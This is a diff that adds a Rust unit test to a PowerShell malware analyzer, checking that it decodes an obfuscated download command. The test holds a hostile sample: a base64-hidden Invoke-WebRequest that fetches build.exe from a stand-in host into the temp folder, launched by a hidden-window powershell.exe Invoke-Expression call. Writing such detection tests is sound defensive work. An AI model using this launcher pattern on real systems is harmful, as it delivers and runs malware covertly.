@@ -20613,6 +20613,34 @@ mod ps1_obfuscation_tests {
     }
 
     #[test]
+    fn encoded_iwr_outfile_variable_destination_is_resolved() {
+        use base64::Engine;
+
+        let payload = r#"$url = "https://biteblob.example/Download/build.exe"
+$file = "$env:TEMP\file.exe"
+Invoke-WebRequest -Uri $url -OutFile $file
+"#;
+        let b64 = base64::engine::general_purpose::STANDARD.encode(payload.as_bytes());
+        let script = format!(
+            r#"powershell.exe -NoProfile -WindowStyle Hidden -Command "Invoke-Expression ([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('{b64}')))""#
+        );
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://biteblob.example/Download/build.exe"
+                        && dst.as_deref()
+                            == Some("C:\\Users\\puncher\\AppData\\Local\\Temp\\file.exe")
+            )
+        });
+        assert!(
+            has,
+            "encoded IWR -OutFile variable destination was not resolved: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn ps1_normalization_decodes_hex_split_char_loop() {
         let ps = r#"$h = '40 65 63 68 6f 20 6f 66 66 0d 0a 65 63 68 6f 20 68 69' -Split ' ' | foreach {[char]([convert]::toint16($_,16))}; $s = $h -join ''"#;
         let normalized = crate::ps1_scan::normalize_ps1_text(ps);
